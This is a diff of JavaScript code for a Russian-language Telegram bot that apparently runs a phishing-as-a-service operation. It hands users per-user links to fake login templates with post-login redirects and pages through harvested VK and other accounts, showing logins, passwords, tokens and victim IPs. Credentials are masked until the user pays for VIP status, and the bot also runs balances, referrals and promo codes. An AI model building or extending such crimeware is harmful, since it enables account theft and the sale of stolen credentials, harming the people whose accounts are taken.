@@ -1,42 +1,40 @@
 const bot = require('./createBot')
-const {GetStringDate,CreateReplayList, GetDateFormat} = require('./server/tools')
+const {
+    GetStringDate,
+    CreateReplayList,
+    GetDateFormat
+} = require('./server/tools')
 const data = require('./database/models/userData')
 const promocode = require('./database/models/promo')
 const account = require('./database/models/account')
 const link = require('./database/models/link')
 const {
     names,
-    links,
     emptyString,
     ReplayListAccs,
     ReplayListLinks,
     vip,
-    Menu
+    Menu,
+    messages
 } = require('./objects')
 async function СreateTransactionList(callbackQuery) {
     const user = await data.findOne({
         tg_id: callbackQuery.message.chat.id,
     })
-    if(user.transactions && user.transactions.length > 0) {
+    if (user.transactions && user.transactions.length > 0) {
         let str = `💸 Ваши  транзакци\n#          Тип транзакции          Баланс                    Дата          \n`
-        user.transactions.map((e,i)=>{
-            str+=`${i+1+' '.repeat(e.type=='Покупка'?18:14)+e.type+' '.repeat(e.type=='Покупка'?18:14)+e.value+(' '.repeat(e.type=='Покупка'?17-Number(e.value.toString().length-4):16-Number(e.value.toString().length-4)))+'<code>'+GetDateFormat(e.date).split(' / ')[0]}</code>     \n`
+        user.transactions.map((e, i) => {
+            str += `${i+1+' '.repeat(e.type=='Покупка'?18:14)+e.type+' '.repeat(e.type=='Покупка'?18:14)+e.value+(' '.repeat(e.type=='Покупка'?17-Number(e.value.toString().length-4):16-Number(e.value.toString().length-4)))+'<code>'+GetDateFormat(e.date).split(' / ')[0]}</code>     \n`
         })
-        bot.editMessageText(str,{
+        bot.editMessageText(str, {
             chat_id: callbackQuery.message.chat.id,
             message_id: callbackQuery.message.message_id,
-            reply_markup: {
-                inline_keyboard:[]
-            },
             parse_mode: 'HTML'
         })
-    }else{
-        bot.editMessageText( `🤷🏻 Ваша история транзакций пуста`,{
+    } else {
+        bot.editMessageText(`🤷🏻 Ваша история транзакций пуста`, {
             chat_id: callbackQuery.message.chat.id,
             message_id: callbackQuery.message.message_id,
-            reply_markup: {
-                inline_keyboard:[]
-            },
             parse_mode: 'HTML'
         })
     }
@@ -54,15 +52,14 @@ async function ShowLinks(callbackQuery) {
                 callback_data: 'showLinkInfo' + '_' + link._id
             }]
         })
-        btnArray[btnArray.length] = [{
-            text: 'Назад',
-            callback_data: 'showLinksMenu'
-        }]
         bot.editMessageText(`Выберите одну из ссылок ниже`, {
             chat_id: callbackQuery.message.chat.id,
             message_id: callbackQuery.message.message_id,
             reply_markup: {
-                inline_keyboard: btnArray
+                inline_keyboard: [...btnArray, [{
+                    text: 'Назад',
+                    callback_data: 'showLinksMenu'
+                }]]
             },
             parse_mode: 'HTML'
         })
@@ -85,7 +82,7 @@ async function ShowLinks(callbackQuery) {
 async function ShowLinkInfo(callbackQuery) {
     const links = await link.findById({
         _id: callbackQuery.data.split('_')[1]
-    }).catch(err => {})
+    })
     let c = 0
     bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id)
     bot.sendPhoto(callbackQuery.message.chat.id, links.query[c].image, {
@@ -116,7 +113,6 @@ async function showPrevLink(callbackQuery) {
         chat_id: callbackQuery.message.chat.id,
         message_id: callbackQuery.message.message_id,
         parse_mode: 'HTML'
-
     })
     await bot.editMessageCaption(`😺 Шаблон #${c+1} [${links.query[c].name}]\n\n${links.query[c].description}\n\n🔗 Постоянная ссылка на шаблон: <code>${links.link}/${callbackQuery.message.chat.id.toString(32)}?${c}</code>\n\n\🚪 Переход после авторизации: <code>${links.query[c].redirect}</code>`, {
         chat_id: callbackQuery.message.chat.id,
@@ -151,7 +147,6 @@ async function showNextLink(callbackQuery) {
         chat_id: callbackQuery.message.chat.id,
         message_id: callbackQuery.message.message_id,
         parse_mode: 'HTML'
-
     })
     await bot.editMessageCaption(`Шаблон #${c+1} [${links.query[c].name}]\n\n${links.query[c].description}\n\nВаша ссылка: <code>${links.link}/${callbackQuery.message.chat.id.toString(32)}?${c}</code>\n\n\🚪 Переход после авторизации: <code>${links.query[c].redirect}</code>`, {
         chat_id: callbackQuery.message.chat.id,
@@ -190,24 +185,26 @@ async function NextAccount(callbackQuery) {
     let type = callbackQuery.data.split('_')[1]
     let BluredLogin = accounts[c].login.includes('@') ? accounts[c].login.split('@')[0].substr(0, Math.floor(accounts[c].login.split('@')[0].length * 20 / 100)) + '*'.repeat(accounts[c].login.split('@')[0].length - Math.floor(accounts[c].login.split('@')[0].length * 20 / 100)) + accounts[c].login.split('@')[1] : accounts[c].login.length < 5 ? '*'.repeat(accounts[c].login.length) : accounts[c].login.substr(0, Math.floor(accounts[c].login.length * 30 / 100)) + '*'.repeat(accounts[c].login.length - Math.floor(accounts[c].login.length * 50 / 100)) + accounts[c].login.substr(accounts[c].login.length - Math.floor(accounts[c].login.length * 20 / 100), accounts[c].login.length)
     let BluredPassword = accounts[c].password.substr(0, Math.floor(accounts[c].password.length * 30 / 100)) + '*'.repeat(accounts[c].password.length - Math.floor(accounts[c].password.length * 50 / 100)) + accounts[c].password.substr(accounts[c].password.length - Math.floor(accounts[c].password.length * 20 / 100), accounts[c].password.length)
-    bot.editMessageText(type == 'vk' ? `Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${user.vip?accounts[c].login:new Date(user.vipDate)>= new Date(accounts[c].date)?accounts[c].login:BluredLogin}</code>\n🗝 Password: <code>${user.vip?accounts[c].password:new Date(user.vipDate)>= new Date(accounts[c].date)?accounts[c].password:BluredPassword}</code>\n🖇  Token: <code>${accounts[c].token||'-'}</code>\n\n🆔 ID:${accounts[c].id||'-'}\n\n🤼 Друзей: ${accounts[c].friends||'-'}\n👨‍👩‍👧‍👦 Подписчиков: ${accounts[c].friends||'-'}\n\n📍 IP: ${accounts[c].ip||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]` : `Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${user.vip?accounts[c].login:new Date(user.vipDate)>= new Date(accounts[c].date)?accounts[c].login:BluredLogin}</code>\n🗝 Password: <code>${user.vip?accounts[c].password:new Date(user.vipDate)>= new Date(accounts[c].date)?accounts[c].password:BluredPassword}</code>\n\n📍 IP: ${accounts[c].ip||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]`, {
-        chat_id: callbackQuery.message.chat.id,
-        message_id: callbackQuery.message.message_id,
-        reply_markup: {
-            inline_keyboard: [
-                accounts[c + 1] ? [{
-                    text: '⬅️',
-                    callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
-                }, {
-                    text: '➡️',
-                    callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
-                }] : [{
-                    text: '⬅️',
-                    callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
-                }],
-            ]
-        },
-        parse_mode: 'HTML'
+    bot.editMessageText(type == 'vk' ?
+    messages.vkMessage(names[type], user.vip ? accounts[c].login : user.vip ? accounts[c].login : new Date(user.vipDate || 0) >= new Date(accounts[c].date) ? accounts[c].login : BluredLogin, user.vip ? accounts[c].password : new Date(user.vipDate || 0) >= new Date(accounts[c].date) ? accounts[c].password : BluredPassword.length, accounts[c].token || '-', accounts[c].id || '-', accounts[c].friends || '-', accounts[c].followers || '-', accounts[c].ip || '-', accounts[c].fake || '-', accounts[c].fakenum|| '-', GetDateFormat(accounts[c].date).split(' / ')[0], GetDateFormat(accounts[c].date).split(' / ')[1], accounts.length, c) :
+    messages.otherMessage(names[type], user.vip ? accounts[c].login : user.vip ? accounts[c].login : new Date(user.vipDate || 0) >= new Date(accounts[c].date) ? accounts[c].login : BluredLogin, user.vip ? accounts[c].password : new Date(user.vipDate || 0) >= new Date(accounts[c].date) ? accounts[c].password : BluredPassword.length, accounts[c].ip || '-', accounts[c].fake || '-', accounts[c].fakenum||'-', GetDateFormat(accounts[c].date).split(' / ')[0], GetDateFormat(accounts[c].date).split(' / ')[1], accounts.length, c), {
+            chat_id: callbackQuery.message.chat.id,
+            message_id: callbackQuery.message.message_id,
+            reply_markup: {
+                inline_keyboard: [
+                    accounts[c + 1] ? [{
+                        text: '⬅️',
+                        callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
+                    }, {
+                        text: '➡️',
+                        callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
+                    }] : [{
+                        text: '⬅️',
+                        callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
+                    }],
+                ]
+            },
+            parse_mode: 'HTML'
     })
 }
 async function PreviousAccount(callbackQuery) {
@@ -223,24 +220,26 @@ async function PreviousAccount(callbackQuery) {
     let type = callbackQuery.data.split('_')[1]
     let BluredLogin = accounts[c].login.includes('@') ? accounts[c].login.split('@')[0].substr(0, Math.floor(accounts[c].login.split('@')[0].length * 20 / 100)) + '*'.repeat(accounts[c].login.split('@')[0].length - Math.floor(accounts[c].login.split('@')[0].length * 20 / 100)) + accounts[c].login.split('@')[1] : accounts[c].login.length < 5 ? '*'.repeat(accounts[c].login.length) : accounts[c].login.substr(0, Math.floor(accounts[c].login.length * 30 / 100)) + '*'.repeat(accounts[c].login.length - Math.floor(accounts[c].login.length * 50 / 100)) + accounts[c].login.substr(accounts[c].login.length - Math.floor(accounts[c].login.length * 20 / 100), accounts[c].login.length)
     let BluredPassword = accounts[c].password.substr(0, Math.floor(accounts[c].password.length * 30 / 100)) + '*'.repeat(accounts[c].password.length - Math.floor(accounts[c].password.length * 50 / 100)) + accounts[c].password.substr(accounts[c].password.length - Math.floor(accounts[c].password.length * 20 / 100), accounts[c].password.length)
-    bot.editMessageText(type == 'vk' ? `Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${user.vip?accounts[c].login:new Date(user.vipDate)>= new Date(accounts[c].date)?accounts[c].login:BluredLogin}</code>\n🗝 Password: <code>${user.vip?accounts[c].password:new Date(user.vipDate)>= new Date(accounts[c].date)?accounts[c].password:BluredPassword}</code>\n🖇  Token: <code>${accounts[c].token||'-'}</code>\n\n🆔 ID:${accounts[c].id||'-'}\n\n🤼 Друзей: ${accounts[c].friends||'-'}\n👨‍👩‍👧‍👦 Подписчиков: ${accounts[c].friends||'-'}\n\n📍 IP: ${accounts[c].ip||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]` : `Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${user.vip?accounts[c].login:new Date(user.vipDate)>= new Date(accounts[c].date)?accounts[c].login:BluredLogin}</code>\n🗝 Password: <code>${user.vip?accounts[c].password:new Date(user.vipDate)>= new Date(accounts[c].date)?accounts[c].password:BluredPassword}</code>\n\n📍 IP: ${accounts[c].ip||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]`, {
-        chat_id: callbackQuery.message.chat.id,
-        message_id: callbackQuery.message.message_id,
-        reply_markup: {
-            inline_keyboard: [
-                accounts[c - 1] ? [{
-                    text: '⬅️',
-                    callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
-                }, {
-                    text: '➡️',
-                    callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
-                }] : [{
-                    text: '➡️',
-                    callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
-                }],
-            ]
-        },
-        parse_mode: 'HTML'
+    bot.editMessageText(type == 'vk' ?
+    messages.vkMessage(names[type], user.vip ? accounts[c].login : user.vip ? accounts[c].login : new Date(user.vipDate || 0) >= new Date(accounts[c].date) ? accounts[c].login : BluredLogin, user.vip ? accounts[c].password : new Date(user.vipDate || 0) >= new Date(accounts[c].date) ? accounts[c].password : BluredPassword.length, accounts[c].token || '-', accounts[c].id || '-', accounts[c].friends || '-', accounts[c].followers || '-', accounts[c].ip || '-', accounts[c].fake || '-', accounts[c].fakenum|| '-', GetDateFormat(accounts[c].date).split(' / ')[0], GetDateFormat(accounts[c].date).split(' / ')[1], accounts.length, c) :
+    messages.otherMessage(names[type], user.vip ? accounts[c].login : user.vip ? accounts[c].login : new Date(user.vipDate || 0) >= new Date(accounts[c].date) ? accounts[c].login : BluredLogin, user.vip ? accounts[c].password : new Date(user.vipDate || 0) >= new Date(accounts[c].date) ? accounts[c].password : BluredPassword.length, accounts[c].ip || '-', accounts[c].fake || '-', accounts[c].fakenum||'-', GetDateFormat(accounts[c].date).split(' / ')[0], GetDateFormat(accounts[c].date).split(' / ')[1], accounts.length, c), {
+            chat_id: callbackQuery.message.chat.id,
+            message_id: callbackQuery.message.message_id,
+            reply_markup: {
+                inline_keyboard: [
+                    accounts[c - 1] ? [{
+                        text: '⬅️',
+                        callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
+                    }, {
+                        text: '➡️',
+                        callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
+                    }] : [{
+                        text: '➡️',
+                        callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
+                    }],
+                ]
+            },
+            parse_mode: 'HTML'
     })
 }
 async function ShowAccounts(callbackQuery) {
@@ -257,18 +256,20 @@ async function ShowAccounts(callbackQuery) {
     if (accounts.length > 0) {
         let BluredLogin = accounts[c].login.includes('@') ? accounts[c].login.split('@')[0].substr(0, Math.floor(accounts[c].login.split('@')[0].length * 20 / 100)) + '*'.repeat(accounts[c].login.split('@')[0].length - Math.floor(accounts[c].login.split('@')[0].length * 20 / 100)) + accounts[c].login.split('@')[1] : accounts[c].login.length < 5 ? '*'.repeat(accounts[c].login.length) : accounts[c].login.substr(0, Math.floor(accounts[c].login.length * 30 / 100)) + '*'.repeat(accounts[c].login.length - Math.floor(accounts[c].login.length * 50 / 100)) + accounts[c].login.substr(accounts[c].login.length - Math.floor(accounts[c].login.length * 20 / 100), accounts[c].login.length)
         let BluredPassword = accounts[c].password.substr(0, Math.floor(accounts[c].password.length * 30 / 100)) + '*'.repeat(accounts[c].password.length - Math.floor(accounts[c].password.length * 50 / 100)) + accounts[c].password.substr(accounts[c].password.length - Math.floor(accounts[c].password.length * 20 / 100), accounts[c].password.length)
-        bot.editMessageText(type == 'vk' ? `Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${user.vip?accounts[c].login:new Date(user.vipDate)>= new Date(accounts[c].date)?accounts[c].login:BluredLogin}</code>\n🗝 Password: <code>${user.vip?accounts[c].password:new Date(user.vipDate)>= new Date(accounts[c].date)?accounts[c].password:BluredPassword}</code>\n🖇  Token: <code>${accounts[c].token||'-'}</code>\n\n🆔 ID:${accounts[c].id||'-'}\n\n🤼 Друзей: ${accounts[c].friends||'-'}\n👨‍👩‍👧‍👦 Подписчиков: ${accounts[c].friends||'-'}\n\n📍 IP: ${accounts[c].ip||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]` : `Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]}☘️\n\n😻 Login: <code>${user.vip?accounts[c].login:new Date(user.vipDate)>= new Date(accounts[c].date)?accounts[c].login:BluredLogin}</code>\n🗝 Password: <code>${user.vip?accounts[c].password:new Date(user.vipDate)>= new Date(accounts[c].date)?accounts[c].password:BluredPassword}</code>\n\n📍 IP: ${accounts[c].ip||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n\n🗓 Дата: ${new Date(accounts[c].date).getDate()+'.'+new Date(accounts[c].date).getMonth()+'.'+new Date(accounts[c].date).getFullYear()}\n🕰 Время: ${new Date(accounts[c].date).getHours()+':'+new Date(accounts[c].date).getMinutes()}\n${emptyString}[${c+1}/${accounts.length}]`, {
-            chat_id: callbackQuery.message.chat.id,
-            message_id: callbackQuery.message.message_id,
-            reply_markup: {
-                inline_keyboard: [
-                    accounts[c + 1] ? [{
-                        text: '➡️',
-                        callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
-                    }] : [],
-                ]
-            },
-            parse_mode: 'HTML'
+        bot.editMessageText(type == 'vk' ?
+            messages.vkMessage(names[type], user.vip ? accounts[c].login : user.vip ? accounts[c].login : new Date(user.vipDate || 0) >= new Date(accounts[c].date) ? accounts[c].login : BluredLogin, user.vip ? accounts[c].password : new Date(user.vipDate || 0) >= new Date(accounts[c].date) ? accounts[c].password : BluredPassword.length, accounts[c].token || '-', accounts[c].id || '-', accounts[c].friends || '-', accounts[c].followers || '-', accounts[c].ip || '-', accounts[c].fake || '-', accounts[c].fakenum|| '-', GetDateFormat(accounts[c].date).split(' / ')[0], GetDateFormat(accounts[c].date).split(' / ')[1], accounts.length, c) :
+            messages.otherMessage(names[type], user.vip ? accounts[c].login : user.vip ? accounts[c].login : new Date(user.vipDate || 0) >= new Date(accounts[c].date) ? accounts[c].login : BluredLogin, user.vip ? accounts[c].password : new Date(user.vipDate || 0) >= new Date(accounts[c].date) ? accounts[c].password : BluredPassword.length, accounts[c].ip || '-', accounts[c].fake || '-', accounts[c].fakenum||'-', GetDateFormat(accounts[c].date).split(' / ')[0], GetDateFormat(accounts[c].date).split(' / ')[1], accounts.length, c), {
+                chat_id: callbackQuery.message.chat.id,
+                message_id: callbackQuery.message.message_id,
+                reply_markup: {
+                    inline_keyboard: [
+                        !accounts[c + 1] ? [] : [{
+                            text: '➡️',
+                            callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
+                        }],
+                    ]
+                },
+                parse_mode: 'HTML'
         })
     } else {
         bot.editMessageText(`🚫 У вас нет аккаунтов ${names[type]}`, {
@@ -285,12 +286,10 @@ async function ShowAccounts(callbackQuery) {
             parse_mode: 'HTML'
         })
     }
-
 }
 
 bot.on("callback_query", async (callbackQuery) => {
     const msg = callbackQuery.message;
-    
     if (callbackQuery.data.split('_')[0] == 'experiance') {
         bot.deleteMessage(msg.chat.id, msg.message_id)
         if (callbackQuery.data.split('_')[1] == 'true') {
@@ -409,12 +408,13 @@ bot.on("callback_query", async (callbackQuery) => {
             },
             parse_mode: "HTML"
         })
-        let c = await data.findOne({tg_id:callbackQuery.data.split('_')[1]}).then(e=>{
-            if(e.ref_id && e.ref_id!=0){
+        let c = await data.findOne({
+            tg_id: callbackQuery.data.split('_')[1]
+        }).then(e => {
+            if (e.ref_id && e.ref_id != 0) {
                 bot.sendMessage(e.ref_id, 'У вас новый реферал 🎊🎉')
             }
         })
-        
         await data.updateOne({
             tg_id: callbackQuery.data.split('_')[1]
         }, {
@@ -472,66 +472,22 @@ bot.on("callback_query", async (callbackQuery) => {
         })
     }
     if (callbackQuery.data == 'promo') {
-        const user = await data.findOne({tg_id: callbackQuery.message.chat.id})
-        bot.editMessageText(`Для активации промокода отправте его в ответ на это сообщение.`, {
+        bot.editMessageText(`Пожалуйста введите промокод.`, {
             chat_id: callbackQuery.message.chat.id,
             message_id: callbackQuery.message.message_id
         })
-        let x = await bot.onReplyToMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id, async function promo(msg) {
-            await promocode.findOne({promo: msg.text}).then(async e=>{
-                if(e){
-                    let usedBy = e.usedBy,used = false
-                    usedBy.map(i=>{
-                        if(i.tg_id == callbackQuery.message.chat.id){
-                            used = true
-                        }
-                    })
-                    if(e.activations < e.mactivation && !used){  
-                        usedBy.push({tg_id: callbackQuery.message.chat.id, login: callbackQuery.message.chat.username, date: new Date()})
-                        await data.updateOne({
-                            tg_id: callbackQuery.message.chat.id
-                        }, {
-                            balance: user.balance + Number(e.value),
-                            transactions: [...user.transactions,{type: 'Промокод', value: '+'+e.value, date: new Date()}]
-                        }, {
-                            upsert: true
-                        })
-                        await promocode.updateOne({
-                            promo: msg.text
-                        }, {
-                            activations: e.activations + 1,
-                            usedBy: usedBy
-                        }, {
-                            upsert: true
-                        }).then((data) => {
-                            if (data) {
-                                bot.editMessageText(`✅ Промокод успешно активирован, вам зачислено на баланс ${e.value} RUB`, {
-                                    chat_id: callbackQuery.message.chat.id,
-                                    message_id: callbackQuery.message.message_id
-                                }).then(it => bot.removeReplyListener(x))
-                            }
-                        }).catch(err => {
-                            bot.editMessageText(`❌ Что-то пошло не так 😥, попробуйте позже`, {
-                                chat_id: callbackQuery.message.chat.id,
-                                message_id: callbackQuery.message.message_id
-                            }).then(it =>  bot.removeReplyListener(x))
-                        });
-                    }else{
-                        bot.editMessageText(`❌ Промокод уже использован максимальное количество раз.`, {
-                            chat_id: callbackQuery.message.chat.id,
-                            message_id: callbackQuery.message.message_id
-                        }).then(it =>  bot.removeReplyListener(x))
-                    }
-                }else{
-                    bot.editMessageText(`❌ Промокод не найден`, {
-                        chat_id: callbackQuery.message.chat.id,
-                        message_id: callbackQuery.message.message_id
-                    }).then(it =>  bot.removeReplyListener(x))
-                }
-            })
-        }) 
+        await data.updateOne({
+            tg_id: callbackQuery.message.chat.id
+        },{edit_mode: true, edit_modeType: 'promo'},{upsert: true});
     }
-    
+    if (callbackQuery.data == 'remove_editmode') {
+        bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id)
+        bot.answerCallbackQuery(callbackQuery.id, {text: 'Вы успешно вышли из режима ввода'});
+        await data.updateOne({
+            tg_id: callbackQuery.message.chat.id
+        },{edit_mode: false, edit_modeType: ''},{upsert: true});
+    }
+
     if (callbackQuery.data.split('_')[0] == 'vip') {
         let c = Number(callbackQuery.data.split('_')[1])
         bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id)
@@ -553,8 +509,12 @@ bot.on("callback_query", async (callbackQuery) => {
         })
         if (callbackQuery.data.split('_')[1].substr(0, 3) == 'vip') {
             let c = Number(callbackQuery.data.split('_')[1].substr(3))
-            if (user.balance >= vip[c].price) { 
-                user.transactions.push({type: 'Покупка', value: vip[c].price*-1, date: new Date()})
+            if (user.balance >= vip[c].price) {
+                user.transactions.push({
+                    type: 'Покупка',
+                    value: vip[c].price * -1,
+                    date: new Date()
+                })
                 let date = user.vip ? new Date(user.vipDate) : new Date()
                 date.setDate(date.getDate() + vip[c].duration)
                 await data.updateOne({
@@ -567,7 +527,7 @@ bot.on("callback_query", async (callbackQuery) => {
                     vipType: c.toString(),
                 }, {
                     upsert: true
-                }).catch(err => console.log(err))
+                })
                 bot.editMessageText(`✅ Поздравляем с успешной покупкой VIP статуса!\n\n😻 По истичению этого времени статус пропадет⤵️\n🙀 ${GetStringDate(date)}`, {
                     chat_id: callbackQuery.message.chat.id,
                     message_id: callbackQuery.message.message_id
